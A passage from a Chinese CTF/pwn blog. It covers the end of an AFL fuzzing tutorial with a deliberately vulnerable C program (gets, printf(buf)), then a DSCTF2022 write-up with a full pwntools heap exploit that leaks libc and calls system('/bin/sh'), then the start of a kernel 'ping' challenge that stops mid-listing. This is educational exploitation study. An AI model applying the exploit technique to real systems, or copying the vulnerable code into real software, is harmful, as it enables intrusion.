<span class="keyword">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    gets(buf);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    vuln(buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用 afl-gcc 进行插桩编译：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  test afl-gcc test.c -o test_afl</span><br><span class="line">➜  test gcc test.c -o test_gcc</span><br></pre></td></tr></table></figure>
<ul>
<li>afl-gcc 插桩编译后，fuzz 的速度会快一些</li>
</ul>
<p>接下来就可以进行 fuzz 了：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  test afl-fuzz -i ./fuzz_in -o ./fuzz_out ./test_afl -f</span><br></pre></td></tr></table></figure>
<ul>
<li>fuzz_in 为语料库，我这里直接使用 AFL 自带的 testcases</li>
<li>fuzz_out 就是输出的内容</li>
</ul>
<p>AFL 状态窗口如下：</p>
<p><img src="/2022/07/26/fuzz%E5%85%A5%E9%97%A8+AFL%E7%9A%84%E4%BD%BF%E7%94%A8/1658801946787.png" alt="1658801946787"> </p>
<p>详细介绍如下：</p>
<p><img src="/2022/07/26/fuzz%E5%85%A5%E9%97%A8+AFL%E7%9A%84%E4%BD%BF%E7%94%A8/1658802035629.png" alt="1658802035629"> </p>
<ul>
<li>Process timing：Fuzzer 运行时长、以及距离最近发现的路径、崩溃和挂起经过了多长时间</li>
<li>Overall results：Fuzzer 当前状态的概述（尤其注意 uniq crashes）</li>
<li>Cycle progress：我们输入队列的距离</li>
<li>Map coverage：目标二进制文件中的插桩代码所观察到覆盖范围的细节</li>
<li>Stage progress：Fuzzer 现在正在执行的文件变异策略、执行次数和执行速度</li>
<li>Findings in depth：有关我们找到的执行路径，异常和挂起数量的信息</li>
<li>Fuzzing strategy yields：关于突变策略产生的最新行为和结果的详细信息</li>
<li>Path geometry：有关 Fuzzer 找到的执行路径的信息</li>
<li>CPU load：CPU利用率</li>
</ul>
<p><strong>Crashes 分析</strong></p>
<p>在 <code>fuzz_out-&gt;crashes</code> 中有许多 crashes 信息，在 AFL 源码的 experimental/crash_triage 目录中有一个名为 triage_crashes.sh 的脚本，可以帮助我们触发收集到的 crashes </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  test ./triage_crashes.sh ./fuzz_out ./test_afl 2&gt;&amp;1 | grep SIGNAL</span><br><span class="line">+++ ID 000000, SIGNAL 11 +++</span><br><span class="line">+++ ID 000001, SIGNAL 06 +++</span><br><span class="line">+++ ID 000002, SIGNAL 06 +++</span><br><span class="line">+++ ID 000003, SIGNAL 06 +++</span><br><span class="line">+++ ID 000004, SIGNAL 06 +++</span><br><span class="line">+++ ID 000005, SIGNAL 11 +++</span><br></pre></td></tr></table></figure>
<ul>
<li>“11”代表了 SIGSEGV 信号，有可能是因为缓冲区溢出导致进程引用了无效的内存</li>
<li>“6”代表了 SIGABRT 信号，通常由 libc 和其他库在出现严重错误时中止程序（也有可能是触发 canary 产生的错误）</li>
</ul>
<p><strong>AFL 练习</strong></p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/mykter/afl-training">Exercises to learn how to fuzz with American Fuzzy Lop</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/21/DSCTF2022/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/07/21/DSCTF2022/" class="post-title-link" itemprop="url">DSCTF2022</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-07-21 11:07:58 / Modified: 11:16:12" itemprop="dateCreated datePublished" datetime="2022-07-21T11:07:58+08:00">2022-07-21</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>3.8k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>3 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>fuzzerinstrospector</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.27</span><span class="number">-3u</span>buntu1<span class="number">.6</span>)</span> stable release version 2.27</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fuzzerinstrospector: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /home/yhellow/tools/glibc-all-in-one/libs/<span class="number">2.27</span><span class="number">-3u</span>buntu1<span class="number">.6</span>_amd64/ld<span class="number">-2.27</span>.so, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=<span class="number">719784b</span>3c6cf918a5fc48dea4142aae94c7f4dec, stripped</span><br><span class="line">[*] <span class="string">&#x27;/home/yhellow/\xe6\xa1\x8c\xe9\x9d\xa2/exp/fuzzerinstrospector&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>Switch-case 6：有一个任意指针调用，只要泄露出 libc_base 就可以 get shell</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">key</span><span class="params">(<span class="keyword">char</span> *chunk_list)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+1Fh] [rbp-11h] BYREF</span></span><br><span class="line">  <span class="keyword">void</span> (__fastcall *code)(<span class="keyword">char</span> *); <span class="comment">// [rsp+20h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  s = <span class="number">0</span>;</span><br><span class="line">  code = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0xCC</span>, <span class="number">0xF0</span>uLL);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;code);</span><br><span class="line">  code(chunk_list);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ canary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先把 tcache 装满，然后通过 unsortedbin 获取 main_arena，接着输入非数字字符使 scanf 写入失败，这样 main_arena 就留在了可控制的 heap 中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x562cbf64c9c0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x562cbf64c9c0</span> ◂— <span class="number">0x6262626262626262</span> (<span class="string">&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x562cbf64c9c8</span> ◂— <span class="number">0x111</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x562cbf64c9d0</span> —▸ <span class="number">0x7f3ef5128ca0</span> (main_arena+<span class="number">96</span>) —▸ <span class="number">0x562cbf64cad0</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>获取 main_arena 需要一点小技巧：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Check</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 index; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 <span class="keyword">index_t</span>; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *chunk; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  index = input();</span><br><span class="line">  <span class="keyword">index_t</span> = index;</span><br><span class="line">  <span class="keyword">if</span> ( index &lt;= <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    index = chunk_list[index];</span><br><span class="line">    <span class="keyword">if</span> ( index )</span><br><span class="line">    &#123;</span><br><span class="line">      chunk = (<span class="keyword">unsigned</span> __int8 *)chunk_list[<span class="keyword">index_t</span>];</span><br><span class="line">      LODWORD(index) = <span class="built_in">puts</span>(<span class="string">&quot;Bitmap set: &quot;</span>);</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">        LODWORD(index) = <span class="built_in">printf</span>(<span class="string">&quot;Bit: %hhu\n&quot;</span>, chunk[chunk[i] + <span class="number">8</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> index;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>chunk-&gt;data 的前8字节会最为 index，使其打印 chunk[index + 8]</li>
<li>我们只需要让 chunk[index + 8] == index，就可以确定前8字节的值了</li>
</ul>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&quot;./fuzzerinstrospector&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./fuzzerinstrospector&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">index,bitmap</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;Index: &quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;: &quot;</span>,<span class="string">&quot;-&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Bitmap: &quot;</span>,bitmap)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,bitmap</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;Index: &quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Bitmap: &quot;</span>,<span class="built_in">str</span>(bitmap))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">indexindex = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">    indexindex += i.to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    create(i,<span class="string">&quot;a&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    create(i,<span class="string">&quot;b&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">7</span>,indexindex)</span><br><span class="line">check(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Bit: &#x27;</span>)</span><br><span class="line">    tmp = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>],<span class="number">10</span>)</span><br><span class="line">    leak_addr += tmp&lt;&lt;(i*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">libc_base = leak_addr-<span class="number">0x3ebca0</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">onegadget=[<span class="number">0x4f2a5</span>,<span class="number">0x4f302</span>,<span class="number">0x10a2fc</span>]</span><br><span class="line">one_gadget=onegadget[<span class="number">2</span>]+libc_base</span><br><span class="line">system_libc = libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(<span class="string">&#x27;/bin/sh\x00&#x27;</span>[i]).encode())</span><br><span class="line">p.sendafter(<span class="string">&#x27;Bitmap: &#x27;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(system_libc))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>题目本身不难，就是打的时候不知道 scanf 写入失败的情况，可惜了</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/19/%E6%AD%BB%E4%BA%A1%E4%B9%8Bping+ICMP%E6%A0%88%E6%BA%A2%E5%87%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/07/19/%E6%AD%BB%E4%BA%A1%E4%B9%8Bping+ICMP%E6%A0%88%E6%BA%A2%E5%87%BA/" class="post-title-link" itemprop="url">死亡之ping+ICMP栈溢出</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-07-19 22:26:54 / Modified: 22:29:18" itemprop="dateCreated datePublished" datetime="2022-07-19T22:26:54+08:00">2022-07-19</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>19k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>18 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>ping 复现</strong></p>
<p>后缀为 .iso，代表没有使用常规的 busybox 文件系统，使用如下命令进行挂载：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  starctf2022_ping sudo mount kernel.iso rootfs</span><br></pre></td></tr></table></figure>
<p>kernel.iso 的文件结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\ywx813\Desktop\<span class="number">2022</span>暑假复现\starctf2022_ping\rootfs&gt;tree /f</span><br><span class="line">卷 OS 的文件夹 PATH 列表</span><br><span class="line">卷序列号为 <span class="number">1</span>AD1<span class="number">-822</span>C</span><br><span class="line">C:.</span><br><span class="line">│  boot.catalog</span><br><span class="line">│</span><br><span class="line">├─boot</span><br><span 